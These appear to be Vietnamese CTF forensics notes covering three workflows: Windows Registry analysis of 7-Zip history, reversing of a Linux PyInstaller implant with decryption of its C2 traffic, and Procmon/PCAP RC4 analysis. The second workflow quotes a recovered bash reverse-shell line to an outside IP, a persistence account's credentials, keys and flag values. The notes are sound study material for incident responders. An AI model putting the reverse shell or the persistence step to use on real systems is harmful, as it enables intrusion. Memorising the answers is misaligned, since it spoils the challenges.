---
title: Skill 
description: Skill 
date: 2026-01-01 00:00:00+0000
image: image.png
categories:
    - CTF
tags:
    - SKILL
weight: 25
---



## FOR 

```text

Khi gặp bài Windows Registry Forensics tương tự, trước hết hãy kiểm kê artefact và tính SHA-256 để bảo toàn bằng chứng, sau đó xác định hive người dùng liên quan (NTUSER.DAT) bằng cách tìm các nhánh ứng dụng đáng ngờ; luôn replay NTUSER.DAT.LOG1/LOG2 vào một bản sao bằng công cụ như regipy để khôi phục thay đổi chưa commit rồi so sánh với hive gốc. Tiếp theo, phân tích các key lịch sử của ứng dụng—với 7-Zip là Software\7-Zip\Extraction, Compression và FM—đồng thời kiểm tra artefact bổ trợ như Explorer\TypedPaths, RecentDocs và ComDlg32. Đừng bỏ qua REG_BINARY: hãy trích và decode chuỗi UTF-16LE để đọc PathHistory, FolderHistory, CopyHistory và ArcHistory; dùng FolderHistory để xác định các thư mục đã enumerate, CopyHistory để tìm nơi staging, ArcHistory cùng Archiver để xác định archive đầu ra, và PanelPath0 kết hợp mục MRU mới nhất để tìm thư mục kết thúc. Cuối cùng, dựng timeline từ Registry LastWrite time, chỉ gán timestamp khi artefact thực sự cung cấp, đối chiếu mỗi kết luận qua ít nhất hai nguồn nếu có thể, và khi submit hãy ưu tiên raw value nguyên bản—đúng full path, extension và dấu \—thay vì câu trả lời rút gọn theo cách diễn đạt của đề.

== 

Giải nén ZIP rồi TAR.GZ, phân tích UAC bằng cách đọc wtmp/wtmp.db để thấy phiên SSH từ 10.10.0.56 của kingmaelor, đối chiếu /etc/passwd (UID 1005, GID 1011) với /etc/group để suy ra kingmaelor:crownspire, sau đó kiểm tra ps, pstree, /proc/*/cmdline, netstat, bodyfile.txt và danh sách hash executable để xác định tiến trình độc hại /srv/AshShare/linux_sys_updater; nhận diện binary là PyInstaller, trích xuất code object client, dùng Python marshal.loads() và dis.dis() để đọc bytecode, thấy master secret ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j, hàm KDF tạo AES key bằng SHA256(SHA256(master).digest()+b'encryption').digest()[:32], thu được key hex 9df1f3bd6110a9684f0b921d6fc79779e9f0d1896615b05bd10b1995121c0c0b rồi tính MD5 trên raw bytes thành 6ffc06ff97ec037753feda5354b650b3; đảo hàm làm rối chuỗi bằng Base64 decode rồi XOR 0x55 và 0xAA để tìm prefix ASH_CLI_, lệnh upload UPLD_FILE và các token giao thức, đồng thời đọc opcode STORE_FAST ngay sau subprocess.check_output() để xác định biến chứa output là Kd3uD9; tự parse PCAP Ethernet/IPv4/TCP, gom TCP stream 10.10.0.10:49892 ↔ 10.10.0.56:443 theo sequence number, tách từng frame bằng độ dài uint32 big-endian, Base64-decode payload thành IV(16)|ciphertext|tag(32), xác minh tag bằng SHA256(hmac_key+IV+ciphertext), giải mã AES-256-CBC và bỏ PKCS#7 padding để dựng transcript theo thời gian, từ đó thấy lệnh thứ hai là ls -la /etc, file tải xuống thứ hai là /etc/hosts, lệnh tạo persistence user chứa credentials backup_usr:9cq3jPVN6Me1; cuối cùng Base64-decode rồi Gzip-decompress payload của lệnh cuối để lộ script ghi bash -i >& /dev/tcp/141.101.64.3/53 0>&1 vào /home/kingmaelor/.local/share/.systemd-helper, qua đó hoàn thành đủ 11 flag.

==

Quy trình tái dùng: kiểm kê artefact/ZIP nhưng không chạy mẫu, export Procmon PML sang CSV rồi lọc Load Image, đường dẫn DLL lạ và Process Create để dựng cây parent PID → child PID/cmdline; đối chiếu timestamp DNS/HTTP trong PCAP với Procmon để xác định timezone rồi đổi mốc load đầu tiên sang Unix epoch; đọc command line `rundll32 ...DLL,Export` và dùng pefile, unpack UPX hoặc phân tích in-memory để lấy export, imports, strings, mutex và hành vi; lọc RegQueryValue quanh thời điểm nhiễm để tìm REG_BINARY 16 byte, ghi hex đúng thứ tự registry; map API thu thập sang ATT&CK, ví dụ OpenClipboard/GetClipboardData = T1115; parse PCAP, reassemble TCP/HTTP, lấy IP đích thật thay vì tin Host giả, tách body từng POST và thử RC4 với key raw rồi đảo thứ tự byte hoặc các biến thể cần thiết đến khi plaintext hợp lệ, đồng thời kiểm tra mọi payload vì có thể có lore/URL mồi trước payload chứa seed phrase; cuối cùng chép đáp án đúng hoa-thường, dấu `\`, hex và khoảng trắng.

```

